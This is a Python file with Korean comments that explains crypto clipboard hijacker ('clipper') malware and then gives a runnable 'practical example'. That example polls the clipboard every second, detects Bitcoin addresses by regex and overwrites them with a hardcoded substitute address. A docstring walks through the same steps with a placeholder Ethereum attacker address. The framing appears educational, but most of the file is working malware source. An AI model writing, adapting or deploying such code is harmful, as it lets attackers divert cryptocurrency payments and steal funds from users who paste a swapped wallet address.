"""
###################################################################
### 암호화폐 클립보드 하이재커(Crypto Clipboard Hijacker, 또는 Clipper Malware)
###################################################################

- 사용자가 암호화폐 지갑 주소를 복사할 때 클립보드의 내용을 가로채서 
  공격자의 지갑 주소로 몰래 바꿔치기하는 악성 소프트웨어의 한 종류

####################################################################
## 클립보드 모니터링

## 파이썬에서는 pyperclip과 같은 외부 라이브러리를 사용하여 클립보드에 접근할 수 있음
## 악성 코드는 일반적으로 무한 루프를 돌면서 클립보드의 내용을 주기적으로 확인
####################################################################

(1) 일반적인 클립보드 모니터링의 개념적 예시 (Pyperclip 라이브러리 가정)


# 라이브러리 설치 
# Pyperclip은 Python에서 클립보드(Clipboard) 기능을 사용할 수 있게 해주는 크로스 플랫폼(cross-platform) 모듈

# pip install pyperclip


import time
import pyperclip # 클립보드 접근 라이브러리 가정

while True:

    try:
        current_clipboard = pyperclip.paste()

        # 2단계: 암호화폐 주소 패턴 감지 로직 호출
        
    except pyperclip.PyperclipException:

        # PyperclipException은 Python의 Pyperclip 모듈에서 클립보드 기능과 관련된 문제가 발생했을 때 발생하는 예외(Exception)의 기본 클래스
        # 클립보드 접근 오류 처리 (예: 다른 프로그램이 클립보드를 사용 중일 때)
        pass
        
    time.sleep(0.5) # 0.5초마다 클립보드 확인


(2) 암호화폐 주소 패턴 감지

        - 복사된 텍스트가 비트코인(BTC), 이더리움(ETH) 등 특정 암호화폐의 지갑 주소 패턴과 일치하는지 정규 표현식(Regular Expression)을 사용하여 검사

           * 정규 표현식 - 문자열 안에서 특정 패턴을 찾고, 확인하고, 바꾸고, 분리하는 데 사용하는 표현식(쉽게 말하면, 문자열을 다루는 강력한 검색·치환 도구)

           * 비트코인 주소 예시 패턴 (일부) : ^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$

           * 이더리움 주소 예시 패턴 : ^0x[a-fA-F0-9]{40}$


(3) 주소 교체 및 클립보드 쓰기

        - 만약 복사된 내용이 암호화폐 주소로 감지되면, 악성 코드는 그 내용을 미리 정해둔 공격자의 지갑 주소로 바꾼 후 클립보드에 덮어쓰기를 함


# 주소 교체 개념적 예시 (2단계 후속 로직)

def is_eth_address(text):

    # 정규 표현식을 사용한 이더리움 주소 검증 로직 가정
    # startswith()**는 대부분의 프로그래밍 언어에서 문자열(String) 타입이 제공하는 메서드(Method)로, 
    # 특정 문자열이 주어진 접두사(prefix)로 시작하는지 여부를 확인하여 참(True) 또는 거짓(False)의 불리언(Boolean) 값을 반환하는 함수

    return len(text) == 42 and text.startswith("0x")

def replace_clipboard(data):

    attacker_eth_address = "0x1234567890abcdef1234567890abcdef12345678" # 공격자의 주소라고 가정

    # is_eth_address (또는 유사한 이름의 함수)는 주로 이더리움(Ethereum) 주소의 유효성을 검사하기 위해 사용되는 함수나 메서드

    if is_eth_address(data):
        pyperclip.copy(attacker_eth_address)
        # 사용자는 교체된 주소를 붙여넣게 됨 



# 클립보드 감시 : pyperclip.paste()를 사용하여 현재 클립보드의 내용을 읽음
# 정규 표현식 : btc_address_pattern은 비트코인 주소 형식을 검사하기 위한 정규 표현식(다른 암호화폐의 주소 형식에 맞게 수정할 수 있음)
# 주소 변경 : 클립보드에 비트코인 주소가 감지되면 이를 공격자의 주소로 변경
# 주기적 체크 : 1초마다 클립보드를 체크하여 변경된 내용을 감지

"""

###################
## (2) 실질적인 예
###################

#pip install pyperclip

import pyperclip
import re
import time

# 암호화폐 주소의 정규 표현식 (여기서는 비트코인 주소를 예시로 사용)
btc_address_pattern = r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$'

# 클립보드의 내용을 감시하고 암호화폐 주소가 있으면 이를 변경하는 함수
def monitor_clipboard():

    last_clipboard = pyperclip.paste()  # 초기 클립보드 내용

    while True:
        current_clipboard = pyperclip.paste()  # 현재 클립보드 내용

        # 클립보드 내용이 변경되었고, 비트코인 주소가 포함된 경우
        if current_clipboard != last_clipboard:
            print(f"클립보드 내용 변경: {current_clipboard}")

            if re.match(btc_address_pattern, current_clipboard):
                print("비트코인 주소 감지됨. 주소를 변경합니다.")

                # 악성 주소로 변경 (예: 사용자 주소를 공격자의 주소로 대체)
                malicious_address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"

                pyperclip.copy(malicious_address)  # 악성 주소로 클립보드 변경
                print(f"새로운 클립보드 주소: {malicious_address}")

            last_clipboard = current_clipboard  # 마지막 클립보드 내용 업데이트

        time.sleep(1)  # 1초마다 클립보드 검사


if __name__ == "__main__":
    print("클립보드 감시를 시작합니다.")   #3CMNFxN1oHBc4R1EpboAL5yzHGgE611Xou

    monitor_clipboard()


